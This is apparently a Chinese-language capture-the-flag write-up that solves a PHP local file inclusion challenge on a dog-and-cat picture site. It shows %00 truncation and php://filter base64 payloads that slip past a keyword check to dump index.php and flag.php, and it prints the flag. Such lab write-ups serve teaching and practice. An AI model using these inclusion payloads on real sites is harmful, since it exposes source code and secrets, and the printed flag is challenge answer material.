![](<./img/Pasted image 20221115084857.png>)

---
首页长这样

![](<./img/Pasted image 20221115084917.png>)

按下`WOOFERS`后访问
```php
/index.php?category=woofers
```
并且随机显示一张小狗的图片

![](<./img/Pasted image 20221115085147.png>)

按下`MEOWERS`后访问
```php
/index.php?category=meowers
```
并且随机显示一张小猫的图片

![](<./img/Pasted image 20221115085322.png>)

---
尝试对`category`进行修改
```php
/index.php?category=123
```
> Sorry, we currently only support woofers and meowers.

```php
/index.php?category=1woofers
```
  
> **Warning**: include(1woofers.php): failed to open stream: No such file or directory in **/var/www/html/index.php** on line **37**  
  
> **Warning**: include(): Failed opening '1woofers.php' for inclusion (include_path='.:/usr/local/lib/php') in **/var/www/html/index.php** on line **37**

说明`category`的参数会经过一次是否包含`woofers`或`meowers`的检查，接着被加上`.php`后缀传给`include`函数进行包含

---
尝试使用`%00`进行截断
```php
/index.php?category=flag.php%00woofers
```
> **Warning**: include(): Failed opening 'flag.php' for inclusion (include_path='.:/usr/local/lib/php') in **/var/www/html/index.php** on line **37**

发现并不能读取到

尝试使用`php://filter`伪协议对`index.php`进行读取

使用一个`php://filter`伪协议的`trick`
```php
/index.php?category=php://filter/read=convert.base64-encode/write=woofers/resource=index
```

返回了`base64`编码后的`index.php`
```php

<?php
$file = $_GET['category'];

if(isset($file))
{
	if(strpos($file, "woofers") !== false || strpos($file, "meowers") !== false || strpos($file, "index")){
		include ($file . '.php');
	}
	else{
		echo "Sorry, we currently only support woofers and meowers.";
	}
}
?>
```
和预想的后端实现一致，不过`index`不出现在第一个位置上就不会被ban，所以上面的`trick`其实可有可无

尝试直接读取`flag.php`
```php
/index.php?category=php://filter/read=convert.base64-encode/write=woofers/resource=flag
```

```php
<!-- Can you read this flag? -->
<?php
 // flag{a8e44af0-53eb-441c-b549-8a5a50523ffe}
?>
```
终于做到水题啦QwQ

#PHP #Web #伪协议 #bypass #encoding #LFI 